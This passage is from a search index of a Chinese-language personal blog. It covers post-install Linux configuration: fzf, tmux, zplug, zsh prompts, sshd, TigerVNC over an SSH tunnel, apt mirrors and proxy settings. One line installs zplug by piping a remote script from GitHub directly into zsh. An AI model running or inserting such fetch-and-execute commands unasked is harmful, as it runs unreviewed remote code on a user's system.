${ZDOTDIR:-$HOME}/.zshrc\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#autojump","title":"autojump","text":"<p>autojump \u4f5c\u7528\uff1aj \u76f4\u63a5\u8df3\u8f6c\u5230\u4efb\u610f\u4e00\u4e2a\u76ee\u5f55</p> <pre><code>git clone git://github.com/wting/autojump.git $ZSH_CUSTOM/plugins/autojump\n\ncd $ZSH_CUSTOM/plugins/autojump\n./install.py or ./uninstall.py #\u5982\u679c\u7cfb\u7edf\u53ea\u8bc6\u522bpython3\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u8f6f\u94fe\u63a5python\u6307\u5411python3\u3002\u6216\u8005python3 install.py\n\n#\u5c06install.py\u7ed3\u5c3e\u8f93\u51fa\u590d\u5236\u5230.zshrc\u4e2d\n</code></pre> <p>\u6309\u7167 install.py \u8f93\u51fa\u63d0\u793a\uff0c\u590d\u5236\u5bf9\u5e94\u4ee3\u7801\u5230 zshrc \u4e2d</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#fzf","title":"fzf","text":"<p>fzf is a general-purpose command-line fuzzy finder.</p> <p>\u4f7f\u7528 fzf \u914d\u5408 ctrl-r\uff0c\u53ef\u4ee5\u6781\u5927\u65b9\u4fbf\u67e5\u627e\u8f93\u5165\u8fc7\u53bb\u6307\u4ee4\u3002</p> <p>\u63a8\u8350\u4f7f\u7528 git \u65b9\u5f0f\uff0c\u4f7f\u7528\u8f6f\u4ef6\u5305\u5b89\u88c5\u7684\u65b9\u5f0f\u6ca1\u6709\u8bbe\u7f6e\u5feb\u6377\u952e\uff08\u5728 bash, zsh \u4e0a\u5747\u662f\u5982\u6b64\uff09\uff0c\u5982 ctrl-r \u641c\u7d22\u65f6\u8c03\u7528 fzf</p> <pre><code>git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf\n~/.fzf/install\n</code></pre> <p>\u5f53\u7136\uff0cfzf \u7684\u529f\u80fd\u8fdc\u4e0d\u6b62\u641c\u7d22\u5386\u53f2\u8bb0\u5f55\uff0c\u66f4\u591a\u7528\u6cd5\u53ef\u4ee5\u67e5\u770b\u89c6\u9891\uff1aVim universe. fzf - command line fuzzy finder - YouTube</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u624b\u52a8\u914d\u7f6e","title":"\u624b\u52a8\u914d\u7f6e","text":"<p>\u5176\u5b9e\u4e3b\u8981\u9700\u8981\u8bbe\u7f6e\u4e09\u4e2a\u5185\u5bb9</p> <ul> <li>fzf bin\uff1a<ul> <li>git clone <code>~/.fzf/install</code> \u5b89\u88c5\u65f6\u4f1a\u6839\u636e\u67b6\u6784\u81ea\u52a8\u4ece github \u4e0b\u8f7d bin \u6587\u4ef6</li> <li>\u5982\u679c\u662f\u975e x86,arm \u7684\u5176\u5b83\u67b6\u6784\uff0c\u53ef\u4ee5\u7528\u5305\u7ba1\u7406\u5668\u5b89\u88c5\uff0c\u6216\u8005\u81ea\u5df1\u60f3\u529e\u6cd5\u7f16\u8bd1\uff0c\u6dfb\u52a0\u5230 PATH \u8def\u5f84\u4e2d\u3002</li> </ul> </li> <li>key-binding\uff1a\u5bf9\u5e94 git \u4ed3\u5e93 .fzf/shell/key-bindings.bash\uff08apt \u5305\u5185\u6587\u4ef6\u8def\u5f84\u7c7b\u4f3c\uff09</li> <li>autocompletion\uff1a\u5bf9\u5e94 git \u4ed3\u5e93  .fzf/shell/completion.bash</li> </ul> <p>windows git bash \u914d\u7f6e fzf\uff0c\u53ef\u4ee5\u901a\u8fc7 git clone fzf \u4ed3\u5e93\uff0c\u7136\u540e\u624b\u52a8\u7f16\u5199\u5982\u4e0b\u6587\u4ef6\uff0csource \u5230 ~/.bash_profile \u4e2d </p> <pre><code># Setup fzf\n# ---------\nif [[ ! \"$PATH\" == */c/Users/15440/.fzf/bin* ]]; then\n  PATH=\"${PATH:+${PATH}:}/c/Users/15440/.fzf/bin\"\nfi\n\n# Auto-completion\n# ---------------\n[[ $- == *i* ]] &amp;&amp; source \"/c/Users/15440/.fzf/shell/completion.bash\" 2&gt; /dev/null\n\n# Key bindings\n# ------------\nsource \"/c/Users/15440/.fzf/shell/key-bindings.bash\"\n</code></pre> <p>apt \u5b89\u88c5 fzf\uff0c\u53ef\u4ee5\u901a\u8fc7 dpkg -L \u67e5\u770b\u5305\u7684\u5305\u542b\u7684\u6587\u4ef6\uff0c\u627e\u5230 bash key-binding \u548c auto completion \u7684\u6587\u4ef6</p> <ul> <li>/usr/share/bash-completion</li> <li>/usr/share/doc/fzf/examples/key-bindings.bash</li> </ul> <p>\u7136\u540e\u5c06\u5176\u5728 bashrc \u4e2d source \u5373\u53ef</p> <pre><code>root@acsa-nfs:~# dpkg -L fzf\n/.\n/usr\n/usr/bin\n/usr/bin/fzf\n/usr/bin/fzf-tmux\n/usr/share\n/usr/share/bash-completion\n/usr/share/bash-completion/completions\n/usr/share/bash-completion/completions/fzf\n/usr/share/doc\n/usr/share/doc/fzf\n/usr/share/doc/fzf/README.Debian\n/usr/share/doc/fzf/changelog.Debian.amd64.gz\n/usr/share/doc/fzf/changelog.Debian.gz\n/usr/share/doc/fzf/changelog.gz\n/usr/share/doc/fzf/copyright\n/usr/share/doc/fzf/examples\n/usr/share/doc/fzf/examples/completion.zsh\n/usr/share/doc/fzf/examples/fzf.vim\n/usr/share/doc/fzf/examples/key-bindings.bash\n/usr/share/doc/fzf/examples/key-bindings.fish\n/usr/share/doc/fzf/examples/key-bindings.zsh\n/usr/share/doc/fzf/examples/plugin\n/usr/share/fish\n/usr/share/fish/vendor_functions.d\n/usr/share/fish/vendor_functions.d/fzf_key_bindings.fish\n/usr/share/man\n/usr/share/man/man1\n/usr/share/man/man1/fzf-tmux.1.gz\n/usr/share/man/man1/fzf.1.gz\n/usr/share/doc/fzf/examples/plugin/fzf.vim\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u95ee\u9898","title":"\u95ee\u9898","text":"<p>\u5982\u679c ctrl-r \u663e\u793a<code>unknown option: --scheme=history</code>\uff0c\u662f\u56e0\u4e3a\u7cfb\u7edf apt \u5b89\u88c5\u7684 fzf \u7248\u672c\u8fc7\u65e7\u5bfc\u81f4\u7684\u3002</p> <p>\u4f7f\u7528 git \u5b89\u88c5\u65f6\uff0c<code>~/.fzf/install</code>\u4f1a\u4e0b\u8f7d fzf bin \u6587\u4ef6\uff0c\u4e4b\u540e\u5c06 git \u4ed3\u5e93\u4e0b<code>.fzf/bin</code>\u6dfb\u52a0\u5230 PATH \u53d8\u91cf\u5c3e\u90e8\u3002\u4f46\u662f\u7531\u4e8e\u662f\u5728 PATH \u5c3e\u90e8\uff0c\u56e0\u6b64\u4f18\u5148\u7ea7\u4e0d\u5982\u7cfb\u7edf\u7684/usr/bin \u76ee\u5f55\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u624b\u52a8\u4fee\u6539<code>.fzf.bash</code>\u6587\u4ef6\u4f7f\u5176\u63d2\u5165\u5230\u5934\u90e8\u3002</p> <pre><code># Setup fzf\n# ---------\n#if [[ ! \"$PATH\" == */staff/fyyuan/.fzf/bin* ]]; then\n#  #PATH=\"${PATH:+${PATH}:}/staff/fyyuan/.fzf/bin\"\n#  PATH=\"/staff/fyyuan/.fzf/bin:$PATH\"\n#fi\nPATH=\"/staff/fyyuan/.fzf/bin:$PATH\"\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u641c\u7d22\u4e0d\u5230\u65f6\u5df2\u7ecf\u8f93\u5165\u7684\u547d\u4ee4\u767d\u8d39","title":"\u641c\u7d22\u4e0d\u5230\u65f6\u5df2\u7ecf\u8f93\u5165\u7684\u547d\u4ee4\u767d\u8d39","text":"<p>Requesting special history search feature: If matching zero, upon entry don't nuke my command, emit it. \u00b7 Issue #3528 \u00b7 junegunn/fzf (github.com)</p> <p>\u6211\u6ca1\u6709\u6210\u529f\u3002\u4e0d\u591f\u6211\u7684\u5386\u53f2\u8bb0\u5f55\u591f\u957f\u4e86\uff0c\u57fa\u672c\u4e0d\u5b58\u5728\u641c\u7d22\u4e3a\u7a7a\u7684\u60c5\u51b5\uff08\u66f4\u591a\u662f\u6a21\u7cca\u641c\u7d22\u627e\u5230\u592a\u591a\u7ed3\u679c\uff09\uff0c\u56e0\u6b64\u5bf9\u6211\u4e5f\u6ca1\u7528\u4e86\u3002</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#tmuxtmuxoh-my-tmux","title":"tmux(.tmux(oh-my-tmux))","text":"<pre><code>git clone https://github.com/gpakosz/.tmux\nln -s -f .tmux/.tmux.conf\ncp .tmux/.tmux.conf.local .\n\ntmux source-file .tmux.conf\n</code></pre> <p>\u6bd4\u8f83\u597d\u7528\u7684\u51e0\u4e2a\u529f\u80fd</p> <p>session</p> <ul> <li><code>&lt;prefix&gt; f enter</code>\uff1a\u663e\u793a\u6240\u6709\u7684\u4f1a\u8bdd\u3001\u7a97\u53e3\uff0c\u5e76\u63d0\u4f9b\u9884\u89c8\u3002\u65b9\u4fbf\u7ba1\u7406\u591a\u4e2a\u4f1a\u8bdd</li> <li><code>&lt;prefix&gt; shift-Tab(BTab)</code>\uff1a\u5207\u6362\u5230\u4e0a\u4e00\u4e2a session</li> <li><code>&lt;prefix&gt; ctrl-c</code>\uff1a\u521b\u5efa\u65b0 session</li> </ul> <ul> <li><code>&lt;prefix&gt; hjkl</code>\uff1a\u5728\u4e0d\u540c panel \u4e2d\u5207\u6362\uff0c\u66f4\u7b26\u5408 vim \u4e60\u60ef</li> <li><code>&lt;prefix&gt; b, P</code>\uff1ab \u663e\u793a\u526a\u5207\u677f\uff08buffer\uff09\uff0cP \u9009\u62e9\u7c98\u8d34</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4fee\u6539","title":"\u4fee\u6539","text":"<p>\u7531\u4e8e tmux \u9ed8\u8ba4\u7684 prefix \u662f<code>Ctrl-b</code>\u4e0d\u592a\u597d\u6309\uff0c\u56e0\u6b64\u6211\u4f1a\u628a\u5b83\u6362\u6210<code>ctrl-x</code></p> <p>\u7a97\u53e3\u5207\u6362\u6539\u4e3a\u4e86<code>tab, C-h, C-l</code>\uff0c\u611f\u89c9\u6709\u70b9\u9ebb\u70e6\uff0c\u56e0\u6b64\u5c06<code>p</code>\u7c98\u8d34\u4e0a\u4e00\u4e2a buffer \u529f\u80fd\u53bb\u6389\uff0c\u6362\u56de\u539f\u672c\u7684<code>n, p</code></p> <pre><code>set -g prefix2 C-x\nbind C-x send-prefix -2\n\nbind -r n previous-window # select previous window\nbind -r p next-window     # select next window\nbind Tab last-window      # move to last active window\n\n#bind p paste-buffer  # paste from the top paste buffer\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zplug","title":"zplug","text":"<p>zplug/zplug: A next-generation plugin manager for zsh (github.com) zsh \u7684\u4e00\u4e2a\u63d2\u4ef6\u7ba1\u7406\u5de5\u5177\uff0c\u7c7b\u4f3c\u7684\u8fd8\u6709<code>Antigen</code>\uff0c\u4f18\u70b9\u662f\u542f\u52a8\u66f4\u52a0\u5feb\u901f\u3002 \u76f8\u6bd4\u4e8e oh-my-zsh \u7684\u63d2\u4ef6\u7ba1\u7406\uff0c\u5b89\u88c5\u914d\u7f6e\u90fd\u66f4\u7b80\u5355\uff08\u5982\u4e0d\u9700\u8981\u624b\u52a8 git clone \u5b89\u88c5\u63d2\u4ef6\uff0c\u6709\u7684\u63d2\u4ef6\u8fd8\u9700\u8981\u4fee\u6539.zshrc \u7b49\uff09</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<p>\u5b89\u88c5</p> <pre><code>curl -sL --proto-redir -all,https https://raw.githubusercontent.com/zplug/installer/master/installer.zsh | zsh\n</code></pre> <p>\u914d\u7f6e\uff1a\u5728<code>.zshrc</code>\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u8282\uff0c\u5176\u4e2d<code>zplug 'endaaman/lxd-completion-zsh'</code>\u6307\u5b9a\u4e86\u9700\u8981\u4f7f\u7528\u7684\u63d2\u4ef6\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5176\u5b83\u63d2\u4ef6</p> <ul> <li>\u5b89\u88c5\u63d2\u4ef6\u9700\u8981\u8bbe\u7f6e\u4ee3\u7406</li> </ul> <pre><code>##########\n#####  zplug\n##########\nsource ~/.zplug/init.zsh\n\n# Zsh completion for lxc and lxd commands of LXD.\nzplug 'endaaman/lxd-completion-zsh'\n\n# Fish-like fast/unobtrusive autosuggestions for zsh.\nzplug 'zsh-users/zsh-autosuggestions'\n\n# Fish shell-like syntax highlighting for Zsh.\nzplug 'zsh-users/zsh-syntax-highlighting'\n\n# Install plugins if there are plugins that have not been installed\nif ! zplug check --verbose; then\n    printf \"Install? [y/N]: \"\n    if read -q; then\n        echo; zplug install\n    fi\nfi\n\n# Then, source plugins and add commands to $PATH\nzplug load\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5bfb\u627e\u63d2\u4ef6","title":"\u5bfb\u627e\u63d2\u4ef6","text":"<ul> <li>zsh-user: zsh-users (github.com)</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u81ea\u5b9a\u4e49-prompt","title":"\u81ea\u5b9a\u4e49 prompt","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#bash","title":"bash","text":"<p>Bash/Prompt customization - ArchWiki (archlinux.org) bash(1) \u2014 Arch manual pages (archlinux.org)</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zsh_1","title":"zsh","text":"<p>Zsh - ArchWiki (archlinux.org)</p> <p>\u521d\u59cb\u5316\u81ea\u5e26\u7684 prompt theme system</p> <pre><code>~/.zshrc\nautoload -Uz promptinit\npromptinit\n</code></pre> <pre><code>prompt -l   # \u5217\u51fa\u6240\u6709\nprompt -p   # \u9884\u89c8\u6240\u6709\nprompt walters  # \u9009\u62e9\u4e00\u4e2atheme\n</code></pre> <p>\u81ea\u5b9a\u4e49 theme</p> <pre><code># Load promptinit\nautoload -Uz promptinit &amp;&amp; promptinit\n\n# Define the theme\nprompt_mytheme_setup() {\n  PS1=\"%~%# \"\n}\n\n# Add the theme to promptsys\nprompt_themes+=( mytheme )\n\n# Load the theme\nprompt mytheme\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#customized","title":"Customized","text":"<ul> <li>\u517c\u5bb9 bash \u7684 left-sided prompt: PS1, PS2, ...\uff0c\u81ea\u5df1\u6709\u522b\u540d\uff1aPROMPT, PROMPT2...</li> <li>\u53e6\u5916\u652f\u6301\u00a0right-sided prompt\uff1a<code>RPS1</code>\u00a0(<code>RPROMPT</code>)</li> </ul> <pre><code>print -P '%B%F{red}co%F{green}lo%F{blue}rs%f%b'   # \u6d4b\u8bd5\u6548\u679c\n\nPROMPT='%n@%m\u00a0%~\u00a0%# '\n\nprint -P \"%l %M %m %n %y %d\"\n%~\n</code></pre> <p>zshmisc(1) \u2014 Arch manual pages (archlinux.org)</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#locale","title":"locale","text":"<p><code>perl: warnning: locale setting failed</code></p> <p>\u662f\u56e0\u4e3a\u8bbe\u7f6e\u4e86\u4ee5\u4e0b\u53d8\u91cf\u5bfc\u81f4\u7684 <pre><code>LANG=en_US.utf8\nLC_ALL=en_US.utf8\n</code></pre></p> <p>docker \u73af\u5883\u4e2d\u53ef\u80fd\u53ea\u6709\u4ee5\u4e0b\u51e0\u79cd\u8bed\u8a00 <pre><code>locale -a\nC\nC.utf8\nPOSIX\n</code></pre> \u89e3\u51b3\u529e\u6cd5\u662f\u5b89\u88c5\u8bed\u8a00\u5305 <pre><code>apt install language-pack-en\n</code></pre></p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u670d\u52a1","title":"\u670d\u52a1","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#sshd","title":"sshd","text":"<p>\u53c2\u8003\uff1aService - OpenSSH | Ubuntu</p> <p>\u5b89\u88c5 openssh-server\uff08\u6709\u53ef\u80fd\u9ed8\u8ba4\u5b89\u88c5\u4e86\uff09</p> <pre><code>sudo apt install openssh-server\n</code></pre> <p>\u914d\u7f6e sshd\uff0c\u5982\u7aef\u53e3</p> <pre><code>sudo vim /etc/ssh/sshd_config\n</code></pre> <p>\u8fd0\u884c sshd</p> <ul> <li> <p>ubuntu</p> <pre><code>sudo systemctl restart sshd.service\n</code></pre> </li> </ul> <ul> <li> <p>deepin \u6ca1\u6709 systemd sshd.service\uff0c\u4f7f\u7528</p> <pre><code>sudo service ssh start\n</code></pre> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vnc","title":"vnc","text":"<p>\u5e38\u7528\u7684\u6709 tigervnc\uff0c\u4f46\u662f\u5b9e\u9645\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u7ecf\u5e38\u9047\u5230\u95ee\u9898\uff0c\u6bd4\u5982\u9ed1\u5c4f\u3001\u4efb\u52a1\u680f\u6d88\u5931\u3001xstartup \u8bbe\u7f6e\u3001\u65e0\u6cd5\u4f7f\u7528 systemd \u7b49\u95ee\u9898\u3002\u9047\u5230\u95ee\u9898\u4e0d\u8981\u614c\uff0c\u53ef\u80fd\u5c31\u662f vnc \u672c\u8eab\u592a\u70c2\u4e86\uff0c\u80fd\u4e0d\u914d\u5c31\u4e0d\u914d\u3002</p> <p>\u95ee\u9898</p> <ul> <li>\u65b0\u7248\u7684 Tigervnc\uff08&gt;=1.10.0\uff09\u4e0d\u518d\u652f\u6301 vncserver \u547d\u4ee4\u542f\u52a8\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u3002\u53d6\u800c\u4ee3\u4e4b\u7684\u662f\u901a\u8fc7 systemed \u4f5c\u4e3a\u7cfb\u7edf\u670d\u52a1\u7684\u65b9\u5f0f\u6765\u542f\u52a8\u3002</li> </ul> <p>\u53c2\u8003\uff1a</p> <ul> <li>VNC \u7684\u5b89\u88c5\u4e0e\u4f7f\u7528 - SYAO</li> </ul> <p>tigervnc&lt;1.10</p> <p>tigervnc github \u4ed3\u5e93TigerVNC/tigervnc readme \u8bf4\u7684\u4e0d\u662f\u5f88\u8be6\u7ec6\uff0c\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5</p> <pre><code>sudo apt install tigervnc-standalone-server\n</code></pre> <p>\u76f4\u63a5 vncserver \u542f\u52a8\uff0c\u7b2c\u4e00\u6b21\u8fd0\u884c\u4f1a\u8bbe\u7f6e\u5bc6\u7801</p> <pre><code>vncserver -localhost no #\u8bbe\u7f6e\u4e3ano localhost\uff0c\u4e0d\u7136\u53ea\u80fd\u5728\u672c\u8ba1\u7b97\u673a\u4e0a\u8bbf\u95ee\uff08LAN\u5185\u7684\u90fd\u4e0d\u884c\uff09\u3002\n</code></pre> <p>\u67e5\u770b vncserver\uff0c\u9ed8\u8ba4\u4e3a\uff1a</p> <pre><code>  vncserver -list   #\u67e5\u770b\u5f53\u524d\u8fd0\u884c\u7684server\n  vncserver -kill :number #\u505c\u6b62\u6307\u5b9a\u7684server\n</code></pre> <p>\u867d\u7136\u6709\u7684\u6559\u7a0b\u8bf4\u8981\u914d\u7f6e xstartup\uff0c\u4f46\u662f\u53ef\u80fd\u4e0d\u914d\u7f6e\u5df2\u7ecf\u53ef\u4ee5\u4e86</p> <ul> <li>deepin \u4e2d\u9700\u8981\u914d\u7f6e\uff0c\u5426\u5219\u4f1a\u9ed1\u5c4f\u3002\u4f46\u662f\u914d\u7f6e\u5b8c\u540e\uff0c\u4ecd\u7136\u9047\u5230\u4e86\u4efb\u52a1\u680f\u6d88\u5931\uff0c\u6d4f\u89c8\u5668\u6253\u5f00 5-6 \u79d2\u7684\u95ee\u9898\u3002<ul> <li>TigerVNC xstartup file for Deepin Linux V20 and Unitech OS Linux V20 (UOS) (github.com)</li> </ul> </li> </ul> <p>\u5ba2\u6237\u7aef\u8fde\u63a5</p> <ul> <li>\u4f7f\u7528 realVNC \u8f93\u5165 ip_address:port</li> </ul> <p>\u4f7f\u7528\u96a7\u9053\u5efa\u7acb\u52a0\u5bc6\u8fde\u63a5</p> <pre><code>ssh -L 59000:localhost:5901 -C -N -l server_user_name server_ip_address\n</code></pre> <ul> <li>-L 59000:localhost:5901   The -L argument specifies the post on your local computer (ours is 59000) to the given host (localhost) and port (5901) on the destination server (server_ip_address).</li> <li>-C: This argument speeds up processes and minimizes resource usage.</li> <li>-N: This argument prevents execution of remote commands and tells SSH to only forward ports.</li> <li>-l server_user_name server_ip_address: This line specifies the user you will use to login to the server.</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5e38\u7528\u64cd\u4f5c\u53c2\u8003","title":"\u5e38\u7528\u64cd\u4f5c\u53c2\u8003","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#apt-\u76f8\u5173","title":"apt \u76f8\u5173","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#apt-\u6362\u6e90","title":"apt \u6362\u6e90","text":"<pre><code>cp /etc/apt/sources.list /etc/apt/sources.list.back #\u5907\u4efd\nsed -i \"s/archive.ubuntu.com/mirrors.ustc.edu.cn/g\" /etc/apt/sources.list\nsed -i \"s/security.ubuntu.com/mirrors.ustc.edu.cn/g\" /etc/apt/sources.list\n</code></pre> <p>\u5728 vim \u4e2d\u624b\u52a8\u66ff\u6362\u5219\u662f%s</p> <pre><code>:%s/security.ubuntu.com/mirrors.ustc.edu.cn/g\n</code></pre> <p>aliyun mirror ubuntu</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#apt-get-\u4e34\u65f6\u4f7f\u7528-sock-\u4ee3\u7406","title":"apt-get \u4e34\u65f6\u4f7f\u7528 sock \u4ee3\u7406","text":"<pre><code>sudo apt-get -o Acquire::http::proxy=\"socks5://127.0.0.1:1089/\" install typora\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#bash-\u8bbe\u7f6e\u4ee3\u7406","title":"bash \u8bbe\u7f6e\u4ee3\u7406","text":"<pre><code>#\u7aef\u53e3\u5bf9\u5e94qv2ray\u8f6f\u4ef6\u9ed8\u8ba4\u8bbe\u7f6e\nexport HTTP_PROXY=http://localhost:8889\nexport HTTPS_PROXY=http://localhost:8889\n</code></pre> <pre><code>unset HTTP_PROXY\nunset HTTPS_PROXY\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#git-\u8bbe\u7f6e\u4ee3\u7406","title":"git \u8bbe\u7f6e\u4ee3\u7406","text":"<pre><code>git config --global http.proxy http://127.0.0.1:1080\ngit config --global https.proxy https://127.0.0.1:1080\n</code></pre> <p>git doc: http.proxy</p> <p>\u547d\u4ee4\u884c\u4e34\u65f6\u4ee3\u7406</p> <pre><code>GIT_TRACE=1 git -c \"http.proxy=address:port\" clone https://...\n</code></pre> <p>\u5982\u679c\u662f SSH \u534f\u8bae\uff08<code>git clone git://xxx</code>\uff09\u9700\u8981\u4f7f\u7528 <code>ProxyCommand</code> </p> <p>\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6 <code>~/.ssh/config</code> <pre><code>Host github.com\n    User git\n    ProxyCommand nc -x 127.0.0.1:1080 %h %p\n</code></pre></p> <p>nc (netcat) \u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u7f51\u7edc\u5de5\u5177\u3002</p> <p>The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets.  It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.</p> <p>man nc gives</p> <ul> <li><code>-X proxy_protocol</code> Use proxy_protocol when talking to the proxy server.  Supported protocols are 4 (SOCKS v.4), 5 (SOCKS v.5) and connect (HTTPS proxy).  If the protocol is not specified, SOCKS version 5 is used</li> <li><code>-x proxy_address[:port]</code>: Connect to destination using a proxy at proxy_address and port.  If port is not specified, the well-known port for the proxy protocol is used (1080 for SOCKS, 3128 for HTTPS).  An IPv6 address can be specified unambiguously by enclosing proxy_address in square brackets.  A proxy cannot be used with any of the options -lsuU.</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u6062\u590d\u9ed8\u8ba4bashrc","title":"\u6062\u590d\u9ed8\u8ba4.bashrc","text":"<ul> <li>\u5728 ubuntu \u4e2d\uff0c\u9ed8\u8ba4\u7684 bashrc \u6587\u4ef6\u5b58\u50a8\u5728 <code>/etc/skel/.bashrc</code></li> 